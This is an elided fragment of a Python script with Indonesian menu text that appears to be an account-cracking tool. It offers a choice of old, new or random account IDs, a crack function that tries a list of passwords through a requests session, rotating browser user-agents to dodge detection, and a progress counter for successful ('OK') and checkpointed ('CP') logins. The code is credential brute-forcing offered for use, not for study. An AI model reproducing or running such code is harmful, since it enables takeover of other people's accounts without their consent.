...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'[1] Akun Old ⟨not recomed⟩')
	print('[2] Akun New ⟨rekomed⟩')
	print('[3] Random ⟨very recomed⟩')
	print('•')
	hu = input('• Pilih : ')
	if hu in ['1','01']:
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r%sRenzz%s»%s___OK:%s___CP:%s  %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
...
'Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1'
...
'Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Mobile Safari/537.36 Edge/40.15254.603'
])
	ses = requests.Session()
	for pw in pwv:
		try:
